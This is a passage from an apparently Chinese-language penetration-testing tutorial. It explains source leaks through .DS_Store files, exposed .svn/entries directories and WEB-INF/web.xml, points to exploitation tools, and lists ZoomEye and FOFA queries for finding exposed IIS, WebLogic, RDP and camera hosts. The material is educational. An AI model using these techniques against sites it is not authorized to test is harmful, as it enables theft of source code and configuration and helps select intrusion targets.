alt="img"></p><p><strong>二、DS_store导致文件泄露</strong></p><p>​    .DS_Store是Mac下Finder用来保存如何展示文件//文件夹的数据文件，每个文件夹下对应一个。由于开发/设计人员在发布代码时未删除文件夹中隐藏的.DS_store，可能造成文件目录结构泄漏、源代码文件等敏感信息的泄露。<br>我们可以模仿一个环境，利用phpstudy搭建PHP环境，把.DS_store文件上传到相关目录。</p><p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps53.jpg" alt="img"><br>然后利用工具进行相关检测<br><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps54.jpg" alt="img"><br>工具下载地址：<a href="https://github.com/lijiejie/ds_store_exp">https://github.com/lijiejie/ds_store_exp</a><br>为了让实验更真实，我们在本地搭建环境，然后建立一个文件夹为admin和一个hello文件夹，利用该工具运行完以后，查看工具文件夹查看有什么结果。<br><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps55.png" alt="img"> <img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps56.jpg" alt="img"><br>此文件和我们在一个文件夹内，如果是苹果用户，把文件copy到相关服务器目录以后，都会默认带一个文件.DS_Store。首先访问test.php文件，查看环境是否成功。<br><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps57.png" alt="img"> <img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps58.jpg" alt="img"><br>环境搭建成功 <img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps59.jpg" alt="img">我们利用工具进行测试，运行完如上图，运行完以后我们可以到工具目录进行查看<br><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps60.png" alt="img"> <img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps61.jpg" alt="img">这是一个.DS_Store文件泄漏利用脚本，它解析.DS_Store文件并递归地下载文件到本地。</p><p><strong>三、SVN导致文件泄露</strong></p><p>​    Subversion，简称SVN，是一个开放源代码的版本控制系统，相对于的RCS、CVS，采用了分支管理系统，它的设计目标就是取代CVS。互联网上越来越多的控制服务从CVS转移到Subversion。<br>    Subversion使用服务端—客户端的结构，当然服务端与客户端可以都运行在同一台服务器上。在服务端是存放着所有受控制数据的Subversion仓库，另一端是Subversion的客户端程序，管理着受控数据的一部分在本地的映射（称为“工作副本”）。在这两端之间，是通过各种仓库存取层（Repository Access，简称RA）的多条通道进行访问的。这些通道中，可以通过不同的网络协议，例如HTTP、SSH等，或本地文件的方式来对仓库进行操作。<br>SVN漏洞在实际渗透测试过程中，利用到也比较多，由于一些开发管理员疏忽造成，原理类似DS_Store漏洞。我们这里不再进行搭建环境，给大家推荐工具，利用方法如下：</p><ol><li>漏洞利用工具： Seay SVN漏洞利用工具</li><li>添加网站url<br>在被利用的网址后面加 /.svn/entries，列出网站目录，甚至下载整站<br><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps62.jpg" alt="img"><br>下载地址：<a href="https://pan.baidu.com/s/1jGA98jG">https://pan.baidu.com/s/1jGA98jG</a></li></ol><p><strong>四**</strong>、WEB-INF/web.xml泄露**</p><p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p><p>WEB-INF主要包含一下文件或目录：</p><p>/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</p><p>/WEB-INF/classes/：含了站点所有用的 <strong>class</strong> 文件，包括 <strong>servlet</strong> <strong>class</strong> 和非<strong>servlet</strong> <strong>class</strong>，他们不能包含在 .<strong>jar</strong>文件中</p><p>/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</p><p>/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。</p><p>/WEB-INF/database.properties：数据库配置文件</p><p>原因：<br>通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取</p><h2 id="1-12-扩展-ZoomEye-hack"><a href="#1-12-扩展-ZoomEye-hack" class="headerlink" title="1.12 扩展: ZoomEye hack"></a>1.12 <strong>扩展:</strong> <strong>ZoomEye</strong> <strong>hack</strong></h2><p>​    ZoomEye 支持公网设备指纹检索和 Web指纹检索的网站，指纹检索包括应用名称、版本、前端框架、后端框架、服务端语言、服务器操作系统、网站容器、内容管理系统和数据库等。<br>设备指纹包括应用名、版本、开放端口、操作系统、服务名、地理位置等。</p><p><strong>1**</strong>、实战搜索**</p><p>我们今天主要讲下如何使用他的语法规则去高级搜索，搜索有用信息。</p><p>· <strong>主机设备搜索组件名称</strong><br>app: 组件名<br>ver: 组件版本<br>例1：搜索使用iis6.0主机：app:”Microsoft-IIS” ver”6.0”，可以看到0.6秒搜索到41，781,210左右的使用iis6.0的主机。</p><p>例2：搜索使weblogic主机：app:”weblogic httpd” port:7001，可以看到0.078秒搜索到42万左右的使用weblogic的主机。</p><p>例3：查询开放3389端口的主机：port:3389</p><p>例4：查询操作系统为Linux系统的服务器，os:linux</p><p>例5：查询公网摄像头：service:”routersetup”</p><p>例6：搜索美国的 Apache 服务器：app:Apache country:US  后面还可以接city: 城市名称</p><p>例7：搜索指定ip信息，ip:121.42.173.26</p><p>例8：查询有关taobao.com域名的信息，site:taobao.com</p><p>例9：搜索标题中包含该字符的网站，title:weblogic</p><p>例10：keywords:Nginx</p><h2 id="1-13-扩展-fofa-hack"><a href="#1-13-扩展-fofa-hack" class="headerlink" title="1.13 扩展: fofa hack"></a>1.13 <strong>扩展:</strong> <strong>fofa hack</strong></h2><p>domain=””||ip=””||host=””||title=””||header=””<br>protocol=”https”，搜索指定协议类型</p><p>app=”phpinfo”搜索某些组件相关系统</p><p>host=”oldboyedu.com/“搜索包含有特定字符的URL</p><p>title=”powered by” &amp;&amp; os==windows搜索网页标题中包含有特定字符并且系统是windows的网页</p><p>详细请看官方详细文档; <a href="https://fofa.so/help">https://fofa.so/help</a></p><p><a href="https://github.com/Threezh1/JSFinder">https://github.com/Threezh1/JSFinder</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
